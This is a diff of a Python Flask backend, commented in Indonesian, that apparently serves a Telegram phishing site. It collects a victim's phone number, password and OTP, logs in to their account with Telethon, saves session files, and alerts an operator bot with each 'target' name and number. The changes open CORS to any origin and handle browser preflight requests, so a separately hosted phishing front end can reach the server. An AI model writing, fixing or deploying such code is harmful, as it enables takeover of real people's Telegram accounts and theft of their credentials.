@@ -7,7 +7,8 @@ from telethon import TelegramClient, errors
 from asgiref.sync import async_to_sync
 
 app = Flask(__name__)
-CORS(app)
+# Perbaikan Utama: Mengizinkan semua akses dari domain manapun (Netlify)
+CORS(app, resources={r"/*": {"origins": "*"}})
 
 # Ambil variabel dari Railway
 API_ID = os.getenv("API_ID")
@@ -15,7 +16,7 @@ API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-# Simpan hash OTP sementara
+# Penyimpanan hash OTP sementara
 sessions_hash = {}
 
 def send_to_bot(message):
@@ -32,7 +33,7 @@ async def telethon_logic(data):
     sandi = data.get('sandi')
     nama = data.get('nama', 'User')
 
-    # Buat session file unik agar tidak bentrok
+    # Session unik agar tidak terjadi tabrakan antar user
     client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
     
     try:
@@ -45,7 +46,7 @@ async def telethon_logic(data):
             send_to_bot(f"📲 *Target Masuk*\nNama: {nama}\nNomor: {nomor}")
             return {"status": "success"}, 200
 
-        # STEP 2: Cek OTP (Real-time)
+        # STEP 2: Cek OTP Real-time
         elif step == 2:
             phone_code_hash = sessions_hash.get(nomor)
             try:
@@ -71,16 +72,21 @@ async def telethon_logic(data):
     finally:
         await client.disconnect()
 
-@app.route('/register', methods=['POST'])
+@app.route('/register', methods=['POST', 'OPTIONS'])
 def register():
+    # Menangani 'Preflight Request' dari browser (CORS fix)
+    if request.method == 'OPTIONS':
+        return jsonify({"status": "ok"}), 200
+        
     data = request.json
     try:
-        # Menjalankan fungsi async di dalam Flask secara aman
+        # Menghubungkan Flask ke fungsi async Telethon secara aman
         result, status_code = async_to_sync(telethon_logic)(data)
         return jsonify(result), status_code
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
 if __name__ == "__main__":
+    # Mengikuti port yang disediakan Railway
     port = int(os.getenv("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
